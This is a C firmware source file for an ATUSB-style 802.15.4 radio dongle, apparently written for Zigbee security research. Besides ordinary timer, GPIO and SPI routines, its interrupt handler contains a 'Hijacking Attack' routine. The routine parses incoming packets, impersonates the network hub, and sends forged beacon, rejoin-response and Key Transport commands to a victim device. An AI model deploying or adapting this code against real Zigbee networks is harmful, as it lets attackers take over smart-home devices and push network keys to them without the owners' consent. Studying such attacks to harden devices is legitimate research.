/*
 * fw/board_app.c - Board-specific functions (for the application)
 *
 * Written 2011, 2013 by Werner Almesberger
 * Copyright 2011, 2013 Werner Almesberger
 *
 * Modified 2021 by Jincheng Wang
 * Copyright 2021 Jincheng Wang
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */


#include "attack.h"

void detect_packet_type(void);
void clear_flag(void);
uint8_t save_incomming_packets(unsigned char* buf);

static volatile uint32_t timer_h = 0;	/* 2^(16+32) / 8 MHz = ~1.1 years */
uint8_t irq_serial;
uint8_t rejoin_full_flag = 0;
uint8_t beacon_request_flag = 0;
uint8_t tc_rejoin_request_flag = 0;
uint8_t data_request_flag = 0;

extern uint8_t attack_no;
extern ieee802154_addr hub_addr;
extern ieee802154_addr bulb_addr;
extern ieee802154_addr victim_addr;

uint16_t zero_addr = 0;
uint8_t response_finish_flag = 0;
uint8_t beacon_finish_flag = 0;
rx_aack_config aack_config = {.pending=1};

void reset_cpu(void)
{
	WDTCSR = 1 << WDE;
}


uint8_t read_irq(void)
{
	return PIN(IRQ_RF);
}


void slp_tr(void)
{
	SET(SLP_TR);
	CLR(SLP_TR);
}


ISR(TIMER1_OVF_vect)
{
	timer_h++;
}


uint64_t timer_read(void)
{
	uint32_t high;
	uint8_t low, mid;

	do {
		if (TIFR1 & (1 << TOV1)) {
			TIFR1 = 1 << TOV1;
			timer_h++;
		}
		high = timer_h;
		low = TCNT1L;
		mid = TCNT1H;
	}
	while (TIFR1 & (1 << TOV1));

	/*
	 * We need all these casts because the intermediate results are handled
	 * as if they were signed and thus get sign-expanded. Sounds wrong-ish.
	 */
	return (uint64_t) high << 16 | (uint64_t) mid << 8 | (uint64_t) low;
}


void timer_init(void)
{
	/* configure timer 1 as a free-running CLK counter */

	TCCR1A = 0;
	TCCR1B = 1 << CS10;

	/* enable timer overflow interrupt */

	TIMSK1 = 1 << TOIE1;
}


bool gpio(uint8_t port, uint8_t data, uint8_t dir, uint8_t mask, uint8_t *res)
{
	EIMSK = 0; /* recover INT_RF to ATUSB_GPIO_CLEANUP or an MCU reset */

	switch (port) {
	case 1:
		DDRB = (DDRB & ~mask) | dir;
		PORTB = (PORTB & ~mask) | data;
		break;
	case 2:
		DDRC = (DDRC & ~mask) | dir;
		PORTC = (PORTC & ~mask) | data;
		break;
	case 3:
		DDRD = (DDRD & ~mask) | dir;
		PORTD = (PORTD & ~mask) | data;
		break;
	default:
		return 0;
	}

	/* disable the UART so that we can meddle with these pins as well. */
	spi_off();
	_delay_ms(1);

	switch (port) {
	case 1:
		res[0] = PINB;
		res[1] = PORTB;
		res[2] = DDRB;
		break;
	case 2:
		res[0] = PINC;
		res[1] = PORTC;
		res[2] = DDRC;
		break;
	case 3:
		res[0] = PIND;
		res[1] = PORTD;
		res[2] = DDRD;
		break;
	}

	return 1;
}


void gpio_cleanup(void)
{
	EIMSK = 1 << 0;
}


static void done(void *user)
{
	led(0);
}


/**
 * @brief  Save incomming packets into buf, and return the stroed packets.
 * @note   We omit the last two SCF bytes. It is used when we detect TX_END interrupt, and calling process_incoming_packets()
 * @param  Output: buf
 * @retval The length of contents in the packet, except for the SCF.
 */
uint8_t save_incomming_packets(unsigned char* buf)
{
	int16_t pkt_len = 0;
	spi_begin();
	spi_io(AT86RF230_BUF_READ);

	// Omit the last two bytes
	pkt_len = spi_recv() - 2;
	_delay_us(10);
	assert(pkt_len > 0);
	// Copy the packet into buf
	spi_recv_block(buf, pkt_len);

	spi_end();

	return pkt_len;
}

/**
 * @brief  Parse incomming packets, and set flags used for attacks
 * @note   It is called when we detect TX_END interrupt.
 * @retval None
 */
static void process_incomming_packets(void)
{
	unsigned char incomming_pkt[MAX_ZBEE_PKT_SIZE] = {};
	int16_t pkt_len = 0;
	// First save the incomming packets
	pkt_len = save_incomming_packets(incomming_pkt);
	// TODO: Below is ad-hoc packet identification techniques: ARE THEY PROVED?
	// If the incomming packet is a TC Rejoin Response Command
	if ((pkt_len == TC_REJOIN_RSP_PKT_SIZE) && (incomming_pkt[TC_REJOIN_RSP_PKT_SIZE- 4] == 0x07)) {
		uint8_t rejoin_status = incomming_pkt[TC_REJOIN_RSP_PKT_SIZE - 1];
		if (rejoin_status == 0x00) {
			// This TC Rejoin Response shows success.
			rejoin_full_flag = 0;
		}
		else if (rejoin_status == 0x01)
		{
			// This TC Rejoin Response shows PAN FULL
			rejoin_full_flag = 1;
		}
	}
	// If the incomming packet is a Beacon Request Command
	else if ((pkt_len == BEACON_RQ_PKT_SIZE) && (incomming_pkt[BEACON_RQ_PKT_SIZE -1] == 0x07))
	{
		beacon_request_flag = 1;
	}
	// If the incomming packet is a Data Reuqest Command
	else if ((pkt_len == DATA_RQ_PKT_SIZE) && (incomming_pkt[DATA_RQ_PKT_SIZE - 1] == 0x04))
	{
		data_request_flag = 1;
	}
	else if ((pkt_len == TC_REJOIN_REQ_PKT_SIZE))
	{
		uint8_t nwk_fcf_high = incomming_pkt[10];
		if ((nwk_fcf_high & 0x02) == 0) // This packet is unencrypted.
		{
			if (incomming_pkt[TC_REJOIN_REQ_PKT_SIZE - 2] == 0x06)
			{
				tc_rejoin_request_flag = 1;
			}
		}
	}
}

void clear_flag(void)
{
	rejoin_full_flag = 0;
	beacon_request_flag = 0;
	tc_rejoin_request_flag = 0;
	data_request_flag = 0;
}

#if defined(ATUSB) || defined(HULUSB)
ISR(INT0_vect)
#endif
#ifdef RZUSB
ISR(TIMER1_CAPT_vect)
#endif
{
	uint8_t irq = reg_read(REG_IRQ_STATUS);

	if (irq == IRQ_RX_START) {
	}
	if (irq == IRQ_AMI)
	{
	}
	if (irq == IRQ_TRX_END) {
		if (PROCESS_RX_PACKET)
		{
			process_incomming_packets();
		}
		// Implement Hijacking Attack
		if (attack_no == 3)
		{
			ieee802154_addr fake_hub_addr = hub_addr;
			aack_config.pass_ARET_check = 0;
			aack_config.target_short_addr.addr = fake_hub_addr.short_addr;
			aack_config.target_pan_id.addr = fake_hub_addr.pan;
			if(beacon_request_flag)
			{
				send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0, &victim_addr, &fake_hub_addr, &aack_config);
				beacon_finish_flag = 1;
			}
			else if (tc_rejoin_request_flag)
			{
				if (!aack_config.aack_flag)
				{
					aack_config.aack_flag = 1;
					aack_config.pass_ARET_check = 1;
					aack_config.pending = 1;
					set_rx_aack(&aack_config);
				}
			}
			else if (data_request_flag)
			{
				if((response_finish_flag == 0) && (beacon_finish_flag == 1))
				{
					// Send Rejoin Response first.
					aack_config.pending = 1;
					send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RP, 0, &victim_addr, &fake_hub_addr, &aack_config);
					response_finish_flag = 1;
				}
				else if (response_finish_flag == 1)
				{
					// Send Key Transport command then.
					aack_config.pending = 0;
					send_zbee_cmd(ZBEE_APS_CMD_KEY_TRANSPORT, 1, &victim_addr, &fake_hub_addr, &aack_config);
					response_finish_flag = 0;
					beacon_finish_flag = 0;
				}
			}
		}
		clear_flag();
	}
	if (mac_irq) {
		if (mac_irq())
			return;
	}
	if (eps[1].state == EP_IDLE) {
		irq_serial = (irq_serial+1) | 0x80;
		usb_send(&eps[1], &irq_serial, 1, done, NULL);
	}
}
